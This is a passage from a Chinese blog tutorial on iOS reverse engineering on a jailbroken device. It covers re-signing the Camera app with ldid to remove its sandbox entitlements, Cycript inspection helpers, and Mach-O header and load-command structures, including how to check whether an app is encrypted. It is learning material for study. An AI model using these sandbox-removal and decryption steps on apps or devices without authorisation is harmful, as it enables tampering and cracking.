class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>com.apple.assetsd.nebulad<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.springboard.activateawayviewplugins<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.springboard.opensensitiveurl<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.springboard.openurlinbackground<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.springboard.setWantsLockButtonEvents<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.wifi.manager-access<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.wlan.authentication<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>fairplay<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">integer</span>&gt;</span>1615507317<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>keychain-access-groups<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>apple<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>com.apple.youtube.credentials<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>com.apple.videouploadplugins.credentials<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>platform-application<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>seatbelt-profiles<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>MobileSlideShow<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></div></pre></td></tr></table></figure>
<p>我们通过发现在<code>seatbelt-profiles</code>下有一个数组，这个数组中保存一个叫做MobileSlideShow的值，所以整个网络都会被堵塞，解决的方法说了两种：</p>
<ol>
<li>写一个守护进程，守护进程来做被沙盒机制所阻断的事情，应用和守护进程之间通过一些IPC的接口进行通信(就像通知或者Mach Ports)。但是IPC-API也可能会被沙盒机制阻断。例如，<code>Camera.app</code>沙盒会阻塞所有可以发送任意数据的IPC API，只有内核通知才可以，但这样会写的比较丑。</li>
<li>对移出沙盒的应用进行重签名，这样才会有权限，我们就可以在动态库中做任何事情，这种方式就要简单一些</li>
</ol>
<p>在这里选择第二种，只对<code>Entitlements.plist</code>文件进行改动是不够的，我们需要使用<code>ldid</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ldid -e Camera &gt; entitlements.xml</div></pre></td></tr></table></figure>
<p>这样子就可以了，这个时候我们的entitlements.xml的内容即为：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.springboard.debugapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>get-task-allow<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>task_for_pid-allow<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>run-unsigned-code<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></div></pre></td></tr></table></figure>
<p>然后我们利用这个xml给app进行重签名之后就可以了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ldid -Sentitlements.xml Camera</div></pre></td></tr></table></figure>
<p>这里注意千万不要走入歧路，一定要cd到那个App的目录底下进行，不要拷出来或者scp到Mac上，看到xml如果不是像上面的话，基本上就失败了。</p>
<p>这个时候我们打开Reveal的时候就连上了，我们如果想要看拍照的那个按钮的类就直接通过UI分析即可，就像snakeninny大神说的，要善于将多种工具结合起来使用：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-07%20%E4%B8%8B%E5%8D%886.19.35.png" alt="屏幕快照 2018-02-07 下午6.19.35.png" title="" class="">
                <p>屏幕快照 2018-02-07 下午6.19.35.png</p>
            </figure>
<p>但是这样也会造成一个问题就是Camera照相就会闪退，所以注意做好备份，运行的时候再把原来的放回去</p>
<h1 id="Cycript语法总结"><a href="#Cycript语法总结" class="headerlink" title="Cycript语法总结"></a>Cycript语法总结</h1><p>之前简单的说了一下语法，但是最近一直使用这个踩了一些坑，那么如何快速的定位到我们所需要的地方呢，下面就是精髓所在了：</p>
<ol>
<li>从全局上了解这个App，最好的方法就会去打印他的视图层次：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UIApp.keyWindow.recursiveDescription().toString()</div></pre></td></tr></table></figure>
<ol>
<li>在我们需要用到框架内的函数时候进行导入：</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadFramework</span>(<span class="params">fw</span>) </span>&#123; </div><div class="line">   <span class="keyword">var</span> h=<span class="string">"/System/Library/"</span>,t=<span class="string">"Frameworks/"</span>+fw+<span class="string">".framework"</span>;</div><div class="line">   [[NSBundle bundleWithPath:h+t]||</div><div class="line">   [NSBundle bundleWithPath:h+<span class="string">"Private"</span>+t] load];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>实现NSLog</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">NSLog_ = dlsym(RTLD_DEFAULT, <span class="string">"NSLog"</span>)</div><div class="line">NSLog = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </div><div class="line">   <span class="keyword">var</span> types = <span class="string">'v'</span>, args = [], count = <span class="built_in">arguments</span>.length;</div><div class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i != count; ++i) &#123;</div><div class="line">      types += <span class="string">'@'</span>;</div><div class="line">      args.push(<span class="built_in">arguments</span>[i]);</div><div class="line">  &#125; </div><div class="line">  <span class="keyword">new</span> Functor(NSLog_, types).apply(<span class="literal">null</span>, args);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>Using CGGeometry functions，有些人还是习惯正向开发时的写法可以用这个:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">function CGPointMake(x, y) &#123; return &#123;x:x, y:y&#125;; &#125;</div><div class="line">function CGSizeMake(w, h) &#123; return &#123;width:w, height:h&#125;; &#125;</div><div class="line">function CGRectMake(x, y, w, h) &#123; return &#123;origin:CGPointMake(x,y), size:CGSizeMake(w, h)&#125;; &#125;</div></pre></td></tr></table></figure>
<ol>
<li>输出对象的属性</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">方法<span class="number">1</span>： 简单基本获取方法。</div><div class="line">*controller（直接在对象前面加个*）</div><div class="line"></div><div class="line">方法<span class="number">2</span>：方法一无法获取，就使用方法<span class="number">2</span></div><div class="line">[i <span class="keyword">for</span> (i <span class="keyword">in</span> *UIApp)]</div><div class="line"></div><div class="line">方法<span class="number">3</span>：建议方法三，方法三能获取到更多</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryPrintIvars</span>(<span class="params">a</span>)</span>&#123; <span class="keyword">var</span> x=&#123;&#125;; <span class="keyword">for</span>(i <span class="keyword">in</span> *a)&#123; <span class="keyword">try</span>&#123; x[i] = (*a)[i]; &#125; <span class="keyword">catch</span>(e)&#123;&#125; &#125; <span class="keyword">return</span> x; &#125;</div></pre></td></tr></table></figure>
<ol>
<li>根据类来获取属性，虽然在上一章博客中说过，但是现在一用就会崩，所以可以尝试这个，isa传递true:</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">printMethods</span>(<span class="params">className, isa</span>) </span>&#123; </div><div class="line">    <span class="keyword">var</span> count = <span class="keyword">new</span> <span class="keyword">new</span> Type(<span class="string">"I"</span>);</div><div class="line">    <span class="keyword">var</span> classObj = (isa != <span class="literal">undefined</span>) ? objc_getClass(className)-&gt;isa :     </div><div class="line">    objc_getClass(className); </div><div class="line">    <span class="keyword">var</span> methods = class_copyMethodList(classObj, count); </div><div class="line">    <span class="keyword">var</span> methodsArray = [];</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; *count; i++) &#123; </div><div class="line">        <span class="keyword">var</span> method = methods[i]; </div><div class="line">        methodsArray.push(&#123;<span class="attr">selector</span>:method_getName(method),     </div><div class="line">        <span class="attr">implementation</span>:method_getImplementation(method)&#125;);</div><div class="line">    &#125;</div><div class="line">        free(methods); </div><div class="line">        <span class="keyword">return</span> methodsArray;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>补充：现在问题已经解决了，在Cydia中将版本装回之前的0.9.0.x版本即可。</p>
<ol>
<li>获取当前的控制器：</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">currentVC</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> app = [UIApplication sharedApplication]  </div><div class="line">    <span class="keyword">var</span> keyWindow = app.keyWindow  </div><div class="line">    <span class="keyword">var</span> rootController = keyWindow.rootViewController  </div><div class="line">    <span class="keyword">var</span> visibleController = rootController.visibleViewController  </div><div class="line">    <span class="keyword">if</span> (!visibleController)&#123;</div><div class="line">       <span class="keyword">return</span> rootController</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> visibleController.childViewControllers[<span class="number">0</span>]</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> vc = currentVC()</div></pre></td></tr></table></figure>
<ol>
<li>获取按钮上的绑定事件(不一定会有太大效果，比赛中可能生效)</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cy# [button allTargets]</div><div class="line">[NSSet setWithArray:@[#&quot;&lt;ViewController: 0x20869990&gt;&quot;]]]</div><div class="line">cy# [button allControlEvents]</div><div class="line">64</div><div class="line">cy# [button actionsForTarget:#0x20869990 forControlEvent:64]</div><div class="line">@[&quot;onClick&quot;]</div></pre></td></tr></table></figure>
<p>剩下的还有创建分类，block等等，不是特别的常用，至少我还没用到，就先不提了，如果想看完整的可以去Wiki上搜索cycript tricks，里面有一些更加神奇的技巧。</p>
<h1 id="Mach-O简介和判断壳"><a href="#Mach-O简介和判断壳" class="headerlink" title="Mach-O简介和判断壳"></a>Mach-O简介和判断壳</h1><p>书中我们学到了一个砸壳的工具叫做<code>dumpdecrypted</code>，那么我们如何简单而又快速的判断一个App到底有没有壳呢？在这里先卖个关子，介绍一下Mach-O先：</p>
<p><code>Mach-O</code> 是 <code>Mach object</code> 文件格式的缩写，它是一种用于记录可执行文件、对象代码、共享库、动态加载代码和内存转储的文件格式。作为 a.out 格式的替代品，Mach-O 提供了更好的扩展性，并提升了符号表中信息的访问速度。</p>
<p>大多数基于 Mach 内核的操作系统都使用 <code>Mach-O</code>。<code>NeXTSTEP</code>、<code>OS X</code>和 <code>iOS</code> 是使用这种格式作为本地可执行文件、库和对象代码的例子。这种可执行文件的格式如下图所示（图是盗来的）：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-08%20%E4%B8%8A%E5%8D%8811.17.41.png" alt="屏幕快照 2018-02-08 上午11.17.41.png" title="" class="">
                <p>屏幕快照 2018-02-08 上午11.17.41.png</p>
            </figure>
<p>文件由三部分组成：<code>Header</code>、<code>Load Commands</code>、<code>Data</code>，下面一一介绍：</p>
<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * The 32-bit mach header appears at the very beginning of the object file for</div><div class="line"> * 32-bit architectures.</div><div class="line"> */</div><div class="line"><span class="keyword">struct</span> mach_header &#123;</div><div class="line">	<span class="keyword">uint32_t</span>	magic;		<span class="comment">/* mach magic number identifier */</span></div><div class="line">	<span class="keyword">cpu_type_t</span>	cputype;	<span class="comment">/* cpu specifier */</span></div><div class="line">	<span class="keyword">cpu_subtype_t</span>	cpusubtype;	<span class="comment">/* machine specifier */</span></div><div class="line">	<span class="keyword">uint32_t</span>	filetype;	<span class="comment">/* type of file */</span></div><div class="line">	<span class="keyword">uint32_t</span>	ncmds;		<span class="comment">/* number of load commands */</span></div><div class="line">	<span class="keyword">uint32_t</span>	sizeofcmds;	<span class="comment">/* the size of all the load commands */</span></div><div class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></div><div class="line">&#125;;</div><div class="line"><span class="comment">/* Constant for the magic field of the mach_header (32-bit architectures) */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	MH_MAGIC	0xfeedface	<span class="comment">/* the mach magic number */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MH_CIGAM	0xcefaedfe	<span class="comment">/* NXSwapInt(MH_MAGIC) */</span></span></div><div class="line"><span class="comment">/*</span></div><div class="line"> * The 64-bit mach header appears at the very beginning of object files for</div><div class="line"> * 64-bit architectures.</div><div class="line"> */</div><div class="line"><span class="keyword">struct</span> mach_header_64 &#123;</div><div class="line">	<span class="keyword">uint32_t</span>	magic;		<span class="comment">/* mach magic number identifier */</span></div><div class="line">	<span class="keyword">cpu_type_t</span>	cputype;	<span class="comment">/* cpu specifier */</span></div><div class="line">	<span class="keyword">cpu_subtype_t</span>	cpusubtype;	<span class="comment">/* machine specifier */</span></div><div class="line">	<span class="keyword">uint32_t</span>	filetype;	<span class="comment">/* type of file */</span></div><div class="line">	<span class="keyword">uint32_t</span>	ncmds;		<span class="comment">/* number of load commands */</span></div><div class="line">	<span class="keyword">uint32_t</span>	sizeofcmds;	<span class="comment">/* the size of all the load commands */</span></div><div class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></div><div class="line">	<span class="keyword">uint32_t</span>	reserved;	<span class="comment">/* reserved */</span></div><div class="line">&#125;;</div><div class="line"><span class="comment">/* Constant for the magic field of the mach_header_64 (64-bit architectures) */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MH_MAGIC_64 0xfeedfacf <span class="comment">/* the 64-bit mach magic number */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MH_CIGAM_64 0xcffaedfe <span class="comment">/* NXSwapInt(MH_MAGIC_64) */</span></span></div></pre></td></tr></table></figure>
<p>Header的作用就是让系统能快速的定位其运行环境和文件类型，分析文件头的工具我们使用<code>otool</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">otool -hv MobileCal</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-08%20%E4%B8%8A%E5%8D%8811.26.10.png" alt="屏幕快照 2018-02-08 上午11.26.10.png" title="" class="">
                <p>屏幕快照 2018-02-08 上午11.26.10.png</p>
            </figure>
<p>同时我们也可以看看fat的headers:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">─[peterpan@panzhenpengdeMacBook-Air] - [~] - [2018-02-08 11:40:43]</div><div class="line">└─[1] otool  -f Bayinotool -f Bayin</div><div class="line">Fat headers</div><div class="line">fat_magic 0xcafebabe</div><div class="line">nfat_arch 2</div><div class="line">architecture 0  #核心1</div><div class="line">    cputype 12</div><div class="line">    cpusubtype 9</div><div class="line">    capabilities 0x0</div><div class="line">    offset 16384</div><div class="line">    size 26107984</div><div class="line">    align 2^14 (16384)</div><div class="line">architecture 1  #核心2</div><div class="line">    cputype 16777228</div><div class="line">    cpusubtype 0</div><div class="line">    capabilities 0x0</div><div class="line">    offset 26132480</div><div class="line">    size 29527600</div><div class="line">    align 2^14 (16384)</div></pre></td></tr></table></figure>
<p>现在我们对于其中的一些参数还不清楚，我们继续往下看，<code>Load Command</code>是跟在头后面的加载命令区，所有的command之和加起来也就是上面的sizeofcmd字段的值，下面是load_command的结构体：</p>
<h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> load_command &#123;</div><div class="line">    <span class="keyword">uint32_t</span> cmd;        <span class="comment">/* type of load command */</span></div><div class="line">    <span class="keyword">uint32_t</span> cmdsize;    <span class="comment">/* total size of command in bytes */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这些命令以LC开头，不同的加载命令有不同的专用结构体，当然上面的两个属性是都有的，命令的名称和长度会告诉系统如何去处理后面的二进制数据，对系统内核加载器和动态链接器起指导作用。如果当前 <code>LC_SEGMENT</code> 包含 <code>section</code>，那么 <code>section</code> 的结构体紧跟在 <code>LC_SEGMENT</code> 的结构体之后，所占字节数由 <code>SEGMENT</code> 的 <code>cmdsize</code> 字段给出：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-08%20%E4%B8%8B%E5%8D%8812.09.25.png" alt="屏幕快照 2018-02-08 下午12.09.25.png" title="" class="">
                <p>屏幕快照 2018-02-08 下午12.09.25.png</p>
            </figure>
<p>这个里面所展现的segement和section也是一开始的图中第三阶段需要加载的数据</p>
<p>接下来是不同Cmd的作用：</p>
<table>
<thead>
<tr>
<th>Cmd</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>LC_SEGMENT/LC_SEGMENT_64</td>
<td>将对应的段中的数据加载并映射到进程的内存空间去</td>
</tr>
<tr>
<td>LC_SYMTAB</td>
<td>符号表信息</td>
</tr>
<tr>
<td>LC_DYSYMTAB</td>
<td>动态符号表信息</td>
</tr>
<tr>
<td>LC_LOAD_DYLINKER</td>
<td>启动动态加载连接器/usr/lib/dyld程序</td>
</tr>
<tr>
<td>LC_UUID</td>
<td>唯一的 UUID，标示该二进制文件，128bit</td>
</tr>
<tr>
<td>LC_VERSION_MIN_IPHONEOS/MACOSX</td>
<td>要求的最低系统版本（Xcode中的Deployment Target）</td>
</tr>
<tr>
<td>LC_MAIN</td>
<td>设置程序主线程的入口地址和栈大小</td>
</tr>
<tr>
<td>LC_ENCRYPTION_INFO</td>
<td>加密信息</td>
</tr>
<tr>
<td>LC_LOAD_DYLIB</td>
<td>加载的动态库，包括动态库地址、名称、版本号等</td>
</tr>
<tr>
<td>LC_FUNCTION_STARTS</td>
<td>函数地址起始表</td>
</tr>
<tr>
<td>LC_CODE_SIGNATURE</td>
<td>代码签名信息</td>
</tr>
</tbody>
</table>
<p>这个时候我们就可以揭晓上面我们埋的一个小坑了，一个App是否加密可以通过<code>otool -l | grep cryptid</code>来查看，如果是1则代表加密了，反之则没有。</p>
<p><strong>补充：LC_DYSYMTAB符号表</strong></p>
<p><code>LC_DYSYMTAB</code>符号表有非常大的作用，捕获到线上 <code>Crash</code> 或者 卡顿 堆栈的地址信息时，需要进行符号还原，进而确认卡顿、崩溃的具体位置，这个使用就要使用到<code>LC_DYSYMTAB</code>符号表；</p>
<p>LC_DYSYMTAB符号表定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> symtab_command &#123;</div><div class="line">    <span class="keyword">uint32_t</span>    cmd;        <span class="comment">/* LC_SYMTAB */</span></div><div class="line">    <span class="keyword">uint32_t</span>    cmdsize;    <span class="comment">/* sizeof(struct symtab_command) */</span></div><div class="line">    <span class="keyword">uint32_t</span>    symoff;        <span class="comment">/* symbol table offset */</span></div><div class="line">    <span class="keyword">uint32_t</span>    nsyms;        <span class="comment">/* number of symbol table entries */</span></div><div class="line">    <span class="keyword">uint32_t</span>    stroff;        <span class="comment">/* string table offset */</span></div><div class="line">    <span class="keyword">uint32_t</span>    strsize;    <span class="comment">/* string table size in bytes */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>符号表在 <code>Mach-O</code>目标文件中的地址可以通过<code>LC_SYMTAB</code>加载命令指定的 <code>symoff</code>找到，对应的符号名称在<code>stroff</code>，总共有<code>nsyms</code>条符号信息</p>
<p>根据 <code>Frame Pointer</code>拿到函数调用的地址（<code>address</code>），然后用<code>address</code> 、符号表、字符串表的对应关系找到对应的函数名，这就是符号解析的思路；</p>
<h2 id="Segement"><a href="#Segement" class="headerlink" title="Segement"></a>Segement</h2><p><code>Mach-O</code> 文件有多个段（<code>Segment</code>），每个段有不同的功能。然后每个段又分为很多小的 <code>Section</code>。 <code>LC_SEGMENT</code> 意味着这部分文件需要映射到进程的地址空间去。一般有以下段名：</p>
<ul>
<li><code>__PAGEZERO</code>:　空指针陷阱段，映射到虚拟内存空间的第一页，用于捕捉对 NULL 指针的引用。</li>
<li><code>__TEXT</code>:　包含了执行代码以及其他只读数据。该段数据可以 <code>VM_PROT_READ</code>(读)、<code>VM_PROT_EXECUTE</code>(执行)，不能被修改。</li>
<li><code>__DATA</code>:　程序数据，该段可写 <code>VM_PROT_WRITE/READ/EXECUTE</code>。</li>
<li><code>__LINKEDIT</code>:　链接器使用的符号以及其他表。</li>
</ul>
<p>段的结构体定义为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> segment_command &#123; <span class="comment">/* for 32-bit architectures */</span></div><div class="line">	<span class="keyword">uint32_t</span>	cmd;		<span class="comment">/* LC_SEGMENT */</span></div><div class="line">	<span class="keyword">uint32_t</span>	cmdsize;	<span class="comment">/* includes sizeof section structs */</span></div><div class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment name */</span></div><div class="line">	<span class="keyword">uint32_t</span>	vmaddr;		<span class="comment">/* memory address of this segment 段的虚拟内存地址*/</span></div><div class="line">	<span class="keyword">uint32_t</span>	vmsize;		<span class="comment">/* memory size of this segment  段的虚拟内存大小*/</span></div><div class="line">	<span class="keyword">uint32_t</span>	fileoff;	<span class="comment">/* file offset of this segment  段在文件中的偏移量*/</span></div><div class="line">	<span class="keyword">uint32_t</span>	filesize;	<span class="comment">/* amount to map from the file  段在文件中的大小*/</span></div><div class="line">	<span class="keyword">vm_prot_t</span>	maxprot;	<span class="comment">/* maximum VM protection */</span></div><div class="line">	<span class="keyword">vm_prot_t</span>	initprot;	<span class="comment">/* initial VM protection */</span></div><div class="line">	<span class="keyword">uint32_t</span>	nsects;		<span class="comment">/* number of sections in segment */</span></div><div class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></div><div class="line">&#125;;</div><div class="line"><span class="keyword">struct</span> segment_command_64 &#123; <span class="comment">/* for 64-bit architectures */</span></div><div class="line">	<span class="keyword">uint32_t</span>	cmd;		<span class="comment">/* LC_SEGMENT_64 */</span></div><div class="line">	<span class="keyword">uint32_t</span>	cmdsize;	<span class="comment">/* includes sizeof section_64 structs */</span></div><div class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment name */</span></div><div class="line">	<span class="keyword">uint64_t</span>	vmaddr;		<span class="comment">/* memory address of this segment */</span></div><div class="line">	<span class="keyword">uint64_t</span>	vmsize;		<span class="comment">/* memory size of this segment */</span></div><div class="line">	<span class="keyword">uint64_t</span>	fileoff;	<span class="comment">/* file offset of this segment */</span></div><div class="line">	<span class="keyword">uint64_t</span>	filesize;	<span class="comment">/* amount to map from the file */</span></div><div class="line">	<span class="keyword">vm_prot_t</span>	maxprot;	<span class="comment">/* maximum VM protection */</span></div><div class="line">	<span class="keyword">vm_prot_t</span>	initprot;	<span class="comment">/* initial VM protection */</span></div><div 